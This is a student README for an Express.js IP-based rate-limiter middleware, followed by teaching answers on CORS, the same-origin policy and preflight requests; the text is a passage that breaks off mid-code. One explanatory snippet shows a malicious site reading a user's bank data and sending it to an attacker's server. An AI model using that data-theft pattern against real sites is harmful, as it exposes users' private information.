# Rate Limiter Middleware - Day 4 NodeJS Submission

A comprehensive rate limiting middleware implementation for Express.js that prevents API abuse by limiting requests per IP address.

---

## 📋 Features

✅ **IP-based rate limiting** - Limits requests per IP address  
✅ **In-memory storage** - Fast, no database required  
✅ **Configurable limits** - Customize window and max requests  
✅ **Multiple rate limiters** - Different limits for different endpoints  
✅ **Automatic cleanup** - Removes expired entries every 5 minutes  
✅ **Rate limit headers** - X-RateLimit-\* headers in responses  
✅ **Admin endpoints** - View and reset rate limits  
✅ **Proxy support** - Handles X-Forwarded-For headers  
✅ **Reset mechanism** - Reset individual or all rate limits

---

## 🚀 Quick Start

### 1. Installation

```bash
cd "Day4/NodeJS Submission"
npm install
```

### 2. Environment Setup

Create a `.env` file:

```env
PORT=3000
MONGODB_URI=mongodb://localhost:27017/rate-limiter-db
```

### 3. Start Server

```bash
npm start
```

Server will run on `http://localhost:3000`

---

## 📖 How It Works

### Rate Limiting Algorithm

```
┌─────────────────────────────────────────────────────────────┐
│              Rate Limiter Flow (Sliding Window)              │
└─────────────────────────────────────────────────────────────┘

Request Arrives
      │
      ▼
Extract Client IP
      │
      ▼
Check Memory Store
      │
      ├─── No Entry Found ──────┐
      │                          │
      │                          ▼
      │                    Create New Entry
      │                    - count: 0
      │                    - resetTime: now + window
      │                          │
      ▼                          │
Entry Exists                     │
      │                          │
      ├─── Reset Time Passed? ──┤
      │         Yes              │
      │                          │
      ▼                          │
Reset Entry                      │
      │                          │
      └──────────┬───────────────┘
                 │
                 ▼
         Increment Count
                 │
                 ▼
         Check Count > Limit?
                 │
        ┌────────┴────────┐
        │                 │
       Yes               No
        │                 │
        ▼                 ▼
   Return 429        Allow Request
   Too Many Requests     │
                         ▼
                     Add Headers
                     - X-RateLimit-Limit
                     - X-RateLimit-Remaining
                     - X-RateLimit-Reset
                         │
                         ▼
                     Next()
```

### Memory Store Structure

```javascript
Map {
  "192.168.1.100" => {
    count: 7,
    resetTime: 1640000000000,
    firstRequestTime: 1639999940000
  },
  "192.168.1.101" => {
    count: 12,  // Blocked (> 10)
    resetTime: 1640000010000,
    firstRequestTime: 1639999950000
  }
}
```

---

## 🛠️ Implementation

### Rate Limiter Middleware

```javascript
const {
  rateLimiter,
  strictRateLimiter,
  lenientRateLimiter,
} = require("./middleware/rateLimiter.middleware");

// Apply to all routes
app.use(rateLimiter);

// Apply to specific route
app.post("/login", strictRateLimiter, loginController);
```

### Configuration Options

```javascript
const { createRateLimiter } = require("./middleware/rateLimiter.middleware");

const customRateLimiter = createRateLimiter({
  windowMs: 60 * 1000, // Time window in milliseconds
  maxRequests: 10, // Maximum requests per window
  message: "Custom message", // Error message
  statusCode: 429, // HTTP status code
  headers: true, // Add rate limit headers
});
```

---

## 📡 API Endpoints

### Test Routes

#### 1. Test Route (Global Rate Limit)

**10 requests per minute**

```http
GET /test
```

**Response:**

```json
{
  "message": "This is test route",
  "rateLimit": {
    "limit": 10,
    "window": "1 minute"
  }
}
```

**Headers:**

```
X-RateLimit-Limit: 10
X-RateLimit-Remaining: 7
X-RateLimit-Reset: 2024-12-28T15:30:00.000Z
```

---

#### 2. Public Route (Lenient Rate Limit)

**30 requests per minute**

```http
GET /public
```

**Response:**

```json
{
  "message": "Public endpoint with lenient rate limiting",
  "rateLimit": {
    "limit": 30,
    "window": "1 minute"
  }
}
```

---

#### 3. Login Route (Strict Rate Limit)

**5 requests per minute**

```http
POST /login
Content-Type: application/json

{
  "email": "user@example.com",
  "password": "password123"
}
```

**Response:**

```json
{
  "message": "Login endpoint with strict rate limiting",
  "rateLimit": {
    "limit": 5,
    "window": "1 minute"
  }
}
```

---

### Admin Routes

#### 4. Get All Active Rate Limits

```http
GET /admin/rate-limits
```

**Response:**

```json
{
  "message": "All active rate limits",
  "count": 3,
  "rateLimits": [
    {
      "ip": "::1",
      "count": 7,
      "limit": 10,
      "remaining": 3,
      "resetTime": "2024-12-28T15:30:00.000Z",
      "resetIn": 45,
      "isBlocked": false
    },
    {
      "ip": "192.168.1.100",
      "count": 12,
      "limit": 10,
      "remaining": 0,
      "resetTime": "2024-12-28T15:31:00.000Z",
      "resetIn": 50,
      "isBlocked": true
    }
  ]
}
```

---

#### 5. Get Rate Limit Status for Specific IP

```http
GET /admin/rate-limits/:ip
```

**Example:**

```http
GET /admin/rate-limits/192.168.1.100
```

**Response:**

```json
{
  "message": "Rate limit status for IP",
  "status": {
    "ip": "192.168.1.100",
    "count": 7,
    "limit": 10,
    "remaining": 3,
    "resetTime": "2024-12-28T15:30:00.000Z",
    "resetIn": 45,
    "isBlocked": false
  }
}
```

**Not Found:**

```json
{
  "message": "No rate limit data found for this IP"
}
```

---

#### 6. Reset Rate Limit for Specific IP

```http
DELETE /admin/rate-limits/:ip
```

**Example:**

```http
DELETE /admin/rate-limits/192.168.1.100
```

**Response:**

```json
{
  "message": "Rate limit reset successfully for IP",
  "ip": "192.168.1.100"
}
```

---

#### 7. Reset All Rate Limits

```http
DELETE /admin/rate-limits
```

**Response:**

```json
{
  "message": "All rate limits have been reset"
}
```

---

## 🚨 Rate Limit Exceeded Response

When rate limit is exceeded:

**Status:** `429 Too Many Requests`

**Headers:**

```
Retry-After: 45
X-RateLimit-Limit: 10
X-RateLimit-Remaining: 0
X-RateLimit-Reset: 2024-12-28T15:30:00.000Z
```

**Response:**

```json
{
  "error": "Rate limit exceeded",
  "message": "Too many requests from this IP, please try again later.",
  "details": {
    "limit": 10,
    "windowMs": 60000,
    "retryAfter": "45 seconds",
    "resetTime": "2024-12-28T15:30:00.000Z"
  }
}
```

---

## 🧪 Testing with cURL

### Test Global Rate Limiter

```bash
# Make 15 requests rapidly (will hit limit at 11th)
for i in {1..15}; do
  echo "Request $i:"
  curl -i http://localhost:3000/test
  echo -e "\n"
done
```

### Test Strict Rate Limiter (Login)

```bash
# Make 10 login attempts (will hit limit at 6th)
for i in {1..10}; do
  echo "Login Attempt $i:"
  curl -X POST http://localhost:3000/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@example.com","password":"test123"}' \
    -i
  echo -e "\n"
done
```

### View Active Rate Limits

```bash
curl http://localhost:3000/admin/rate-limits | json_pp
```

### Check Specific IP

```bash
# For localhost (::1 or 127.0.0.1)
curl http://localhost:3000/admin/rate-limits/::1 | json_pp
```

### Reset Specific IP

```bash
curl -X DELETE http://localhost:3000/admin/rate-limits/::1
```

### Reset All Rate Limits

```bash
curl -X DELETE http://localhost:3000/admin/rate-limits
```

---

## 📊 Testing with Postman

### Collection Setup

1. **Create Collection:** "Rate Limiter API"

2. **Add Requests:**

**Test Route:**

```
GET http://localhost:3000/test
```

**Public Route:**

```
GET http://localhost:3000/public
```

**Login Route:**

```
POST http://localhost:3000/login
Headers: Content-Type: application/json
Body (raw JSON):
{
  "email": "test@example.com",
  "password": "test123"
}
```

**Admin - View All:**

```
GET http://localhost:3000/admin/rate-limits
```

**Admin - View IP:**

```
GET http://localhost:3000/admin/rate-limits/::1
```

**Admin - Reset IP:**

```
DELETE http://localhost:3000/admin/rate-limits/::1
```

**Admin - Reset All:**

```
DELETE http://localhost:3000/admin/rate-limits
```

3. **Test Collection Runner:**
   - Select "Rate Limiter API" collection
   - Click "Run"
   - Set Iterations: 15
   - Set Delay: 0ms
   - Run to test rate limiting

---

## 🔧 Advanced Usage

### Custom Rate Limiter

```javascript
const { createRateLimiter } = require("./middleware/rateLimiter.middleware");

// API endpoints - 100 requests per minute
const apiRateLimiter = createRateLimiter({
  windowMs: 60 * 1000,
  maxRequests: 100,
  message: "API rate limit exceeded",
});

// File upload - 3 uploads per hour
const uploadRateLimiter = createRateLimiter({
  windowMs: 60 * 60 * 1000, // 1 hour
  maxRequests: 3,
  message: "Upload limit exceeded. Please try again later.",
});

// Password reset - 3 attempts per hour
const passwordResetLimiter = createRateLimiter({
  windowMs: 60 * 60 * 1000, // 1 hour
  maxRequests: 3,
  message: "Too many password reset attempts.",
});

// Apply to routes
app.use("/api", apiRateLimiter);
app.post("/upload", uploadRateLimiter, uploadController);
app.post("/reset-password", passwordResetLimiter, resetController);
```

### Programmatic Control

```javascript
const {
  resetIpLimit,
  resetAllLimits,
  getRateLimitStatus,
  getAllRateLimitStatuses,
  cleanupExpiredEntries,
} = require("./middleware/rateLimiter.middleware");

// Reset specific IP (e.g., after user contact support)
app.post("/admin/whitelist/:ip", (req, res) => {
  const { ip } = req.params;
  resetIpLimit(ip);
  res.json({ message: "IP whitelisted temporarily" });
});

// Get rate limit info before making request
app.get("/check-limit", (req, res) => {
  const ip = getClientIp(req);
  const status = getRateLimitStatus(ip);
  res.json({ status });
});

// Manual cleanup
app.post("/admin/cleanup", (req, res) => {
  const cleaned = cleanupExpiredEntries();
  res.json({ message: `Cleaned ${cleaned} expired entries` });
});
```

---

## 🎯 Rate Limiter Types

### 1. Global Rate Limiter

**10 requests per minute**

```javascript
app.use(rateLimiter);
```

**Use Case:** Default protection for all endpoints

---

### 2. Strict Rate Limiter

**5 requests per minute**

```javascript
app.post("/login", strictRateLimiter, loginController);
```

**Use Cases:**

- Login attempts
- Password reset requests
- Account creation
- Sensitive operations

---

### 3. Lenient Rate Limiter

**30 requests per minute**

```javascript
app.get("/public", lenientRateLimiter, publicController);
```

**Use Cases:**

- Public API endpoints
- Health checks
- Static content
- Read-only operations

---

## 🧩 Features Explained

### 1. IP Detection

Handles multiple scenarios:

```javascript
// Direct connection
req.connection.remoteAddress; // "192.168.1.100"

// Behind proxy (Nginx, Apache)
req.headers["x-forwarded-for"]; // "203.0.113.0, 192.168.1.100"

// Load balancer
req.headers["x-real-ip"]; // "203.0.113.0"
```

### 2. Automatic Cleanup

Runs every 5 minutes:

```javascript
// Removes expired entries to prevent memory leaks
setInterval(cleanupExpiredEntries, 5 * 60 * 1000);
```

### 3. Graceful Shutdown

```javascript
process.on("SIGINT", () => {
  clearInterval(cleanupInterval);
  console.log("Rate limiter cleanup stopped");
});
```

---

## 📈 Monitoring

### View Active Rate Limits

```bash
curl http://localhost:3000/admin/rate-limits
```

**Example Output:**

```json
{
  "message": "All active rate limits",
  "count": 5,
  "rateLimits": [
    {
      "ip": "::1",
      "count": 7,
      "limit": 10,
      "remaining": 3,
      "resetTime": "2024-12-28T15:30:00.000Z",
      "resetIn": 45,
      "isBlocked": false
    },
    {
      "ip": "192.168.1.100",
      "count": 12,
      "limit": 10,
      "remaining": 0,
      "resetTime": "2024-12-28T15:31:00.000Z",
      "resetIn": 50,
      "isBlocked": true
    }
  ]
}
```

---

## 🔒 Security Best Practices

### 1. Secure Admin Routes

```javascript
const adminAuth = require("./middleware/adminAuth");

app.use("/admin", adminAuth); // Protect admin routes
app.get("/admin/rate-limits", getAllLimits);
```

### 2. Different Limits for Different Endpoints

```javascript
// Public: 30/min
app.get("/posts", lenientRateLimiter, getPosts);

// Authentication: 5/min
app.post("/login", strictRateLimiter, login);
app.post("/signup", strictRateLimiter, signup);

// API: 10/min
app.use("/api", rateLimiter);
```

### 3. Rate Limit Sensitive Operations

```javascript
const sensitiveRateLimiter = createRateLimiter({
  windowMs: 60 * 60 * 1000, // 1 hour
  maxRequests: 3,
});

app.post("/reset-password", sensitiveRateLimiter, resetPassword);
app.post("/change-email", sensitiveRateLimiter, changeEmail);
app.delete("/account", sensitiveRateLimiter, deleteAccount);
```

---

## 🚀 Performance

### Memory Usage

- **Per IP Entry:** ~100 bytes
- **1,000 active IPs:** ~100 KB
- **10,000 active IPs:** ~1 MB

**Minimal memory footprint!**

### Response Time

- **Rate limit check:** < 1ms
- **No database queries:** Instant verification
- **Automatic cleanup:** Runs in background

---

## 🛡️ Advantages of In-Memory Storage

✅ **Fast:** No network/database latency  
✅ **Simple:** No external dependencies  
✅ **Reliable:** No database connection issues  
✅ **Cost-effective:** No Redis/database costs

⚠️ **Limitations:**

- Resets on server restart
- Not shared across multiple server instances
- For production with multiple servers, consider Redis

---

## 🔄 Production Considerations

### For Multiple Server Instances

Use Redis for shared rate limit store:

```javascript
const Redis = require("ioredis");
const redis = new Redis();

const rateLimiter = async (req, res, next) => {
  const ip = getClientIp(req);
  const key = `ratelimit:${ip}`;

  const current = await redis.incr(key);

  if (current === 1) {
    await redis.expire(key, 60); // 60 seconds
  }

  if (current > 10) {
    return res.status(429).json({ error: "Rate limit exceeded" });
  }

  next();
};
```

### Environment Variables

```env
RATE_LIMIT_WINDOW=60000
RATE_LIMIT_MAX=10
RATE_LIMIT_STRICT_MAX=5
RATE_LIMIT_LENIENT_MAX=30
```

---

## 📚 Summary

**Machine Coding Question Completed! ✅**

Implemented:

- ✅ Rate limiting middleware
- ✅ IP-based request counting
- ✅ In-memory storage
- ✅ Appropriate error responses
- ✅ Reset mechanism (individual & global)
- ✅ Multiple rate limiter types
- ✅ Admin endpoints for management
- ✅ Automatic cleanup
- ✅ Rate limit headers
- ✅ Proxy support

**Extra Features:**

- Multiple configurable rate limiters
- Comprehensive admin API
- Automatic expired entry cleanup
- Detailed rate limit status
- Production-ready code
- Full documentation

---

## 🎓 Key Concepts Demonstrated

1. **Middleware Pattern** - Express middleware implementation
2. **In-Memory Caching** - Using Map for fast lookups
3. **Sliding Window** - Time-based rate limiting algorithm
4. **IP Detection** - Handling proxies and load balancers
5. **Memory Management** - Automatic cleanup of expired data
6. **REST API** - Admin endpoints for management
7. **Error Handling** - Proper HTTP status codes
8. **Configuration** - Flexible rate limiter creation
9. **Performance** - Efficient O(1) lookups
10. **Production Ready** - Graceful shutdown, monitoring

---

## 📞 Contact

For questions or issues, please contact the development team.

**Happy Rate Limiting! 🚀**

---

## 📖 Theoretical Questions & Answers

### 1. What is CORS? Why does it exist?

**CORS (Cross-Origin Resource Sharing)** is a security mechanism that allows or restricts web applications running at one origin (domain) to access resources from a different origin.

#### What is an Origin?

An origin is defined by three components:

```
Protocol + Domain + Port

https://example.com:443
│       │           │
Protocol Domain    Port
```

**Examples:**

```javascript
// Same Origin
https://example.com/page1
https://example.com/page2
✅ Same protocol, domain, and port

// Different Origins
https://example.com        (HTTPS)
http://example.com         (HTTP) ❌ Different protocol

https://example.com        (Port 443)
https://example.com:3000   (Port 3000) ❌ Different port

https://example.com        (example.com)
https://api.example.com    (api.example.com) ❌ Different subdomain

https://example.com        (example.com)
https://example.org        (example.org) ❌ Different domain
```

---

#### Why Does CORS Exist?

**Security Reasons:**

1. **Prevent Data Theft**
   ```javascript
   // Without CORS, a malicious site could:
   // 1. User logs into bank.com
   // 2. User visits evil.com
   // 3. evil.com makes requests to bank.com
   // 4. Browser automatically sends cookies
   // 5. evil.com steals user's banking data
   ```

2. **Protect User Privacy**
   - Prevents unauthorized access to private APIs
   - Stops malicious sites from reading sensitive data

3. **Control Access**
   - Server decides who can access its resources
   - Whitelist specific domains

---

#### How CORS Works

**Simple Request:**

```javascript
// Client (https://frontend.com)
fetch('https://api.backend.com/data')
  .then(response => response.json())
  .then(data => console.log(data))

// Browser automatically adds:
Origin: https://frontend.com

// Server responds with:
Access-Control-Allow-Origin: https://frontend.com
// or
Access-Control-Allow-Origin: *  // Allow all origins
```

**Flow:**

```
┌─────────────────────────────────────────────────────┐
│                   CORS Request Flow                 │
└─────────────────────────────────────────────────────┘

Browser (https://frontend.com)
      │
      │ 1. User clicks button
      │    "Fetch data from API"
      │
      ▼
   JavaScript
fetch('https://api.backend.com/data')
      │
      │ 2. Browser adds Origin header
      │    Origin: https://frontend.com
      │
      ▼
─────────────────────────────────────────────────────
      │
      │ 3. Request sent to server
      │
      ▼
Server (https://api.backend.com)
      │
      │ 4. Server checks origin
      │    Is frontend.com allowed?
      │
      ├─── YES ──┐
      │          │
      │          ▼
      │    Add CORS headers
      │    Access-Control-Allow-Origin: https://frontend.com
      │          │
      │          ▼
      │    Return data + CORS headers
      │          │
      ▼          │
─────────────────┘
      │
      │ 5. Response with CORS headers
      │
      ▼
   Browser
      │
      │ 6. Browser checks CORS headers
      │    Does origin match?
      │
      ├─── YES ──┐
      │          │
      │          ▼
      │    Allow JavaScript to read response
      │          │
      │          ▼
      │    Data available to frontend
      │
      └─── NO ───┐
                 │
                 ▼
           Block response
     CORS Error in console
```

---

#### CORS Error Example

**Without CORS Configuration:**

```javascript
// Frontend: https://myapp.com
fetch('https://api.example.com/data')

// Browser Console:
// ❌ Access to fetch at 'https://api.example.com/data' 
//    from origin 'https://myapp.com' has been blocked by 
//    CORS policy: No 'Access-Control-Allow-Origin' header 
//    is present on the requested resource.
```

---

### 2. Explain the Same-Origin Policy.

**Same-Origin Policy (SOP)** is a critical security mechanism that restricts how documents or scripts from one origin can interact with resources from another origin.

#### Core Principle

**"A web page can only access resources from the same origin (protocol + domain + port) unless explicitly allowed."**

---

#### What SOP Restricts

**1. JavaScript Access to Cross-Origin Resources**

```javascript
// Page: https://example.com

// ✅ ALLOWED: Same origin
fetch('https://example.com/api/data')        // Same origin
document.cookie                              // Read own cookies
localStorage.getItem('token')                // Read own storage

// ❌ BLOCKED: Different origin
fetch('https://api.other.com/data')          // Different domain
iframe.contentWindow.document                // Cross-origin iframe
```

**2. Cookie Access**

```javascript
// Cookies are scoped to origin
// https://example.com can only read cookies for example.com

// ✅ Can read
document.cookie  // Cookies for example.com

// ❌ Cannot read
// Cookies for other.com
```

**3. DOM Access**

```javascript
// Page: https://example.com

// ❌ Cannot access cross-origin iframe
const iframe = document.querySelector('iframe')
iframe.contentWindow.document  // Security Error!

// ❌ Cannot access window opened from different origin
const popup = window.open('https://other.com')
popup.document  // Security Error!
```

---

#### What SOP Allows

**1. Loading Cross-Origin Resources**

```html
<!-- ✅ These are ALLOWED by SOP -->

<!-- Images -->
<img src="https://other.com/image.jpg">

<!-- Scripts -->
<script src="https://cdn.example.com/library.js"></script>

<!-- Stylesheets -->
<link rel="stylesheet" href="https://cdn.example.com/styles.css">

<!-- Videos -->
<video src="https://other.com/video.mp4"></video>

<!-- Fonts -->
@font-face {
  src: url('https://fonts.com/font.woff2');
}
```

**2. Form Submissions**

```html
<!-- ✅ Can submit forms to different origin -->
<form action="https://other.com/submit" method="POST">
  <input type="text" name="data">
  <button type="submit">Submit</button>
</form>
```

**3. Navigation**

```javascript
// ✅ Can navigate to different origin
window.location.href = 'https://other.com'
```

---

#### Why Same-Origin Policy Exists

**1. Prevent Data Theft**

```javascript
// WITHOUT SOP (dangerous scenario):
// User logged into bank.com
// User visits evil.com
// evil.com could:

fetch('https://bank.com/account')
  .then(res => res.json())
  .then(data => {
    // Evil site reads user's bank account data!
    sendToEvilServer(data)
  })

// WITH SOP: ✅ Blocked!
```

**2. Prevent Session Hijacking**

```javascript
// WITHOUT SOP:
// evil.com could read cookies from bank.com
document.cookie  // Read all cookies, including session tokens

// WITH SOP: ✅ Each origin has isolated cookies
```

**3. Protect User Privacy**

```javascript
// WITHOUT SOP:
// Malicious site could read:
- Email contents (gmail.com)
- Social media messages (facebook.com)
- Banking information (bank.com)

// WITH SOP: ✅ Each site is isolated
```

---

#### SOP vs CORS

```javascript
// Same-Origin Policy (SOP)
// Default security model: BLOCKS cross-origin requests

// CORS (Cross-Origin Resource Sharing)
// Opt-in mechanism: Server ALLOWS specific cross-origin requests

// Example:
// SOP: "Block everything from different origins"
// CORS: "Server says: Allow requests from frontend.com"
```

---

#### Origin Comparison Examples

```javascript
// Current Page: https://example.com:443/page.html

// ✅ SAME ORIGIN
https://example.com:443/other.html
https://example.com/api/data

// ❌ DIFFERENT ORIGIN
http://example.com/page.html              // Different protocol (http vs https)
https://example.com:3000/page.html        // Different port (3000 vs 443)
https://api.example.com/page.html         // Different subdomain
https://example.org/page.html             // Different domain
```

---

#### Bypassing SOP (Legitimate Ways)

**1. CORS (Server Permission)**

```javascript
// Server explicitly allows cross-origin requests
app.use(cors({
  origin: 'https://frontend.com'
}))
```

**2. JSONP (Legacy)**

```javascript
// Uses <script> tag (not recommended anymore)
<script src="https://api.example.com/data?callback=handleData"></script>
```

**3. postMessage (Cross-window Communication)**

```javascript
// Safe way to communicate between different origins
// Parent window
iframe.contentWindow.postMessage('Hello', 'https://other.com')

// Child iframe
window.addEventListener('message', (event) => {
  if (event.origin === 'https://parent.com') {
    console.log(event.data)  // 'Hello'
  }
})
```

**4. Proxy Server**

```javascript
// Frontend makes request to same-origin proxy
// Proxy forwards to different origin

// Frontend (https://example.com)
fetch('/api/proxy/data')  // Same origin

// Backend Proxy (https://example.com)
app.get('/api/proxy/data', async (req, res) => {
  const data = await fetch('https://other.com/data')
  res.json(data)
})
```

---

### 3. What are preflight requests? When do they occur?

**Preflight Request** is an automatic HTTP OPTIONS request sent by the browser BEFORE the actual request to check if the cross-origin request is safe to send.

#### Why Preflight Requests Exist

**Purpose:**
- Ask server: "Can I send this request?"
- Check permissions before sending sensitive data
- Prevent potentially dangerous requests

---

#### When Do Preflight Requests Occur?

**Simple Requests (NO Preflight):**

A request is "simple" if ALL conditions are met:

```javascript
// ✅ No preflight needed

// 1. Method is one of:
GET, HEAD, POST

// 2. Headers are only:
Accept
Accept-Language
Content-Language
Content-Type (with specific values)

// 3. Content-Type is one of:
application/x-www-form-urlencoded
multipart/form-data
text/plain

// Example: Simple request
fetch('https://api.example.com/data', {
  method: 'GET'
})
// No preflight! Request sent immediately.
```

---

**Complex Requests (WITH Preflight):**

Preflight is triggered if ANY of these conditions are true:

```javascript
// ❌ Triggers preflight

// 1. Method is NOT simple:
PUT, DELETE, PATCH, CONNECT, OPTIONS, TRACE

// 2. Custom headers:
Authorization
X-Custom-Header

// 3. Content-Type is:
application/json
application/xml
text/xml

// 4. Request includes credentials:
credentials: 'include'
```

---

#### Preflight Request Flow

**Example: Sending JSON data**

```javascript
// Frontend: https://frontend.com

fetch('https://api.backend.com/users', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer token123'
  },
  body: JSON.stringify({ name: 'John' })
})
```

**Complete Flow:**

```
┌──────────────────────────────────────────────────────┐
│            Preflight Request Flow                     │
└──────────────────────────────────────────────────────┘

Step 1: Browser Sends Preflight Request
──────────────────────────────────────────────────────
Browser → Server
OPTIONS /users HTTP/1.1
Host: api.backend.com
Origin: https://frontend.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization

(Browser asks: "Can I send POST with these headers?")


Step 2: Server Responds to Preflight
──────────────────────────────────────────────────────
Server → Browser
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400

(Server says: "Yes, you can send that request!")


Step 3: Browser Sends Actual Request
──────────────────────────────────────────────────────
Browser → Server
POST /users HTTP/1.1
Host: api.backend.com
Origin: https://frontend.com
Content-Type: application/json
Authorization: Bearer token123

{"name": "John"}


Step 4: Server Responds with Data
──────────────────────────────────────────────────────
Server → Browser
HTTP/1.1 201 Created
Access-Control-Allow-Origin: https://frontend.com

{"id": 1, "name": "John"}
```

---

#### Preflight Request Example

**Preflight Request:**

```http
OPTIONS /api/users HTTP/1.1
Host: api.backend.com
Origin: https://frontend.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization
```

**Preflight Response:**

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Headers: Authorization
Access-Control-Max-Age: 3600
```

**Actual Request (if preflight succeeds):**

```http
DELETE /api/users/123 HTTP/1.1
Host: api.backend.com
Origin: https://frontend.com
Authorization: Bearer token123
```

---

#### Preflight Headers Explained

**Request Headers:**

```javascript
// Browser sends:
Access-Control-Request-Method: POST
// "I want to send POST request"

Access-Control-Request-Headers: Content-Type, Authorization
// "I want to send these headers"
```

**Response Headers:**

```javascript
// Server responds:
Access-Control-Allow-Origin: https://frontend.com
// "Requests from frontend.com are allowed"

Access-Control-Allow-Methods: GET, POST, PUT, DELETE
// "These methods are allowed"

Access-Control-Allow-Headers: Content-Type, Authorization
// "These headers are allowed"

Access-Control-Max-Age: 86400
// "Cache this preflight response for 24 hours"
```

---

#### Examples: Preflight vs No Preflight

**1. Simple GET (No Preflight)**

```javascript
// ✅ No preflight
fetch('https://api.example.com/data')

// Request sent immediately:
GET /data HTTP/1.1
```

---

**2. POST with JSON (Preflight)**

```javascript
// ❌ Triggers preflight (application/json)
fetch('https://api.example.com/users', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'John' })
})

// Two requests:
// 1. OPTIONS /users (preflight)
// 2. POST /users (actual)
```

---

**3. DELETE Request (Preflight)**

```javascript
// ❌ Triggers preflight (DELETE method)
fetch('https://api.example.com/users/123', {
  method: 'DELETE'
})

// Two requests:
// 1. OPTIONS /users/123 (preflight)
// 2. DELETE /users/123 (actual)
```

---

**4. Custom Header (Preflight)**

```javascript
// ❌ Triggers preflight (custom header)
fetch('https://api.example.com/data', {
  headers: { 'X-Custom-Header': 'value' }
})

// Two requests:
// 1. OPTIONS /data (preflight)
// 2. GET /data (actual)
```

---

#### Avoiding Unnecessary Preflights

**Use Access-Control-Max-Age:**

```javascript
// Server caches preflight response
app.use(cors({
  maxAge: 86400  // 24 hours
}))

// First request: Preflight + Actual
// Subsequent requests (within 24h): Only Actual
```

**Use Simple Requests When Possible:**

```javascript
// ❌ Triggers preflight
fetch('/api/data', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(data)
})

// ✅ No preflight (if possible)
fetch('/api/data', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams(data)
})
```

---

### 4. How do you configure CORS in Express?

There are multiple ways to configure CORS in Express, from simple to advanced.

---

#### Method 1: Using `cors` Package (Recommended)

**Installation:**

```bash
npm install cors
```

**Basic Usage:**

```javascript
const express = require('express')
const cors = require('cors')

const app = express()

// Enable CORS for all routes and all origins
app.use(cors())

app.get('/api/data', (req, res) => {
  res.json({ message: 'CORS enabled!' })
})
```

---

#### Method 2: Specific Origin

```javascript
const cors = require('cors')

// Allow only specific origin
app.use(cors({
  origin: 'https://frontend.com'
}))

// Now only https://frontend.com can access this API
```

---

#### Method 3: Multiple Origins

```javascript
const allowedOrigins = [
  'https://frontend.com',
  'https://app.frontend.com',
  'http://localhost:3000'  // For development
]

app.use(cors({
  origin: function(origin, callback) {
    // Allow requests with no origin (mobile apps, Postman)
    if (!origin) return callback(null, true)
    
    if (allowedOrigins.includes(origin)) {
      callback(null, true)  // Origin is allowed
    } else {
      callback(new Error('Not allowed by CORS'))
    }
  }
}))
```

---

#### Method 4: Dynamic Origin (Environment-based)

```javascript
app.use(cors({
  origin: process.env.NODE_ENV === 'production'
    ? 'https://frontend.com'
    : 'http://localhost:3000'
}))
```

---

#### Method 5: Full Configuration

```javascript
app.use(cors({
  origin: 'https://frontend.com',           // Allowed origin
  methods: ['GET', 'POST', 'PUT', 'DELETE'], // Allowed methods
  allowedHeaders: ['Content-Type', 'Authorization'], // Allowed headers
  exposedHeaders: ['X-Total-Count'],         // Headers client can read
  credentials: true,                         // Allow cookies
  maxAge: 86400,                            // Preflight cache (24 hours)
  optionsSuccessStatus: 200                 // For legacy browsers
}))
```

---

#### Method 6: Route-Specific CORS

```javascript
const cors = require('cors')

// Public route - Allow all origins
app.get('/public', cors(), (req, res) => {
  res.json({ message: 'Public data' })
})

// Protected route - Specific origin only
app.get('/private', cors({ origin: 'https://frontend.com' }), (req, res) => {
  res.json({ message: 'Private data' })
})

// No CORS - Same origin only
app.get('/internal', (req, res) => {
  res.json({ message: 'Internal API' })
})
```

---

#### Method 7: Manual CORS Headers (Without Package)

```javascript
// Manual CORS middleware
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'https://frontend.com')
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE')
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
  res.header('Access-Control-Allow-Credentials', 'true')
  
  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200)
  }
  
  next()
})
```

---

#### Method 8: Wildcard (Allow All) - Development Only

```javascript
// ⚠️ NOT RECOMMENDED FOR PRODUCTION

app.use(cors({
  origin: '*'  // Allow ALL origins
}))

// Or manually:
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*')
  next()
})
```

---

#### Complete Example with Credentials

```javascript
const express = require('express')
const cors = require('cors')
const cookieParser = require('cookie-parser')

const app = express()

// CORS configuration
const corsOptions = {
  origin: 'https://frontend.com',
  credentials: true,  // Allow cookies
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400
}

app.use(cors(corsOptions))
app.use(cookieParser())
app.use(express.json())

// Login route - sets cookie
app.post('/login', (req, res) => {
  // Set cookie
  res.cookie('session', 'abc123', {
    httpOnly: true,
    secure: true,
    sameSite: 'none'  // Required for cross-origin cookies
  })
  
  res.json({ message: 'Logged in' })
})

// Protected route - reads cookie
app.get('/profile', (req, res) => {
  const session = req.cookies.session
  
  if (!session) {
    return res.status(401).json({ error: 'Not authenticated' })
  }
  
  res.json({ user: 'John Doe' })
})

app.listen(3000)
```

**Frontend (with credentials):**

```javascript
// Must include credentials: 'include'
fetch('https://api.backend.com/login', {
  method: 'POST',
  credentials: 'include',  // Send cookies
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email: 'user@example.com' })
})

fetch('https://api.backend.com/profile', {
  credentials: 'include'  // Send cookies
})
```

---

#### Advanced: Regex Pattern for Origins

```javascript
app.use(cors({
  origin: function(origin, callback) {
    // Allow all subdomains of example.com
    const pattern = /^https:\/\/([a-z0-9-]+\.)?example\.com$/
    
    if (!origin || pattern.test(origin)) {
      callback(null, true)
    } else {
